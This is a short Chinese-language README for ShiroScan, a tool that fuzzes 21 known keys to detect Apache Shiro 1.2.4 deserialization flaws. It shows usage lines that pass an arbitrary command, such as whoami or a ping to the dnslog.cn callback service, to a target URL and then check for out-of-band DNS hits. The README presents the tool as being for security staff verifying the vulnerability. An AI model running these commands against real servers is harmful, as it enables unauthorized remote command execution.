# ShiroScan
Shiro&lt;=1.2.4反序列化，一键检测工具

```
集成21个key进行fuzz
```

* 如果有帮助，请点个star哦，blog：www.svenbeast.com
* pip3 install -r requirments.txt     

* Usage：python3 shiro.py  url  command
* Usage：python3 shiro.py  http://url.com  whoami

* http://www.dnslog.cn/   验证推荐使用这个dnslog平台，速度比ceye.io要快很多
* 执行的命令带空格记得用""引起来

* usage：python3 shiro.py  http://url.com  "ping dnslog.cn"
* 7个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为编码还不够多
* 请自行收集编码，在moule下的源代码中自行添加方法即可

## 不推荐当做exp使用，效率问题
## 仅供安全人员验证,测试是否存在此漏洞
